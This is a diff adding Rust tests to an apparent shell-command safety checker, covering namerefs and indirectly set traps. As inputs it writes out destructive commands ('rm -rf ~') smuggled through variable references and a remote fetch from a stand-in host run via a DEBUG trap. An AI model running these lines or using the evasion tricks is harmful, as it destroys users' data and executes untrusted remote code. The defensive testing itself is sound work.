@@ -164,3 +164,62 @@ fn a_trap_behind_builtin_command_or_eval_is_a_trap() {
         &["trap 'rm -f \"$tmp\"' EXIT", "builtin cd /tmp && ls"],
     );
 }
+
+/// Measured allowed on the base of this change (2026-11-19): a write
+/// through a reference is a write to the name it refers to, and reading
+/// one reads that name.
+#[test]
+fn a_write_through_a_nameref_is_a_write_to_its_target() {
+    assert_verdict(
+        "deny",
+        &[
+            "C=ok; declare -n R=C; R='rm -rf ~'; sh -c \"$C\"",
+            "C=ok; typeset -n R=C; R='rm -rf ~'; bash -c \"$C\"",
+            "C=ok; declare -n R=C; declare -n S=R; S='rm -rf ~'; sh -c \"$C\"",
+            "C='rm -rf ~'; declare -n R=C; sh -c \"$R\"",
+            "f() { local -n R=C; R='rm -rf ~'; }; C=ok; f; sh -c \"$C\"",
+        ],
+    );
+    // A reference whose name the line does not say may write any name.
+    assert_verdict(
+        "review",
+        &[
+            "C=ok; declare -n R=$1; R='rm -rf ~'; sh -c \"$C\"",
+            "C=ok; declare -n R=C; read R; sh -c \"$C\"",
+        ],
+    );
+    assert_verdict(
+        "allow",
+        &[
+            "declare -n ref=arr; ref+=(x)",
+            "f() { local -n out=$1; out=done; }; f result",
+            "C='echo ok'; declare -n R=C; R='make test'; sh -c \"$C\"",
+        ],
+    );
+}
+
+/// Measured allowed on the base of this change (2026-11-19): a trap set
+/// through a variable is still a trap.
+#[test]
+fn a_trap_set_through_a_variable_is_a_trap() {
+    let after = "C='echo ok'; sh -c \"$C\"";
+    let set = "f() { C=$(curl -s http://x.example/p); }";
+    for trap in [
+        "E=\"trap f DEBUG\"; eval \"$E\"",
+        "t=trap; $t f DEBUG",
+        "t=trap; \"${t}\" f DEBUG",
+        "s=DEBUG; eval trap f \"$s\"",
+        "$T f DEBUG",
+        "eval \"$(printf 'trap f DEBUG')\"",
+    ] {
+        let line = format!("{set}; {trap}; {after}");
+        assert_ne!(verdict(&line), "allow", "{line}");
+    }
+    assert_verdict(
+        "allow",
+        &[
+            "t=echo; $t hi; C='echo ok'; sh -c \"$C\"",
+            "X=make; $X test",
+        ],
+    );
+}
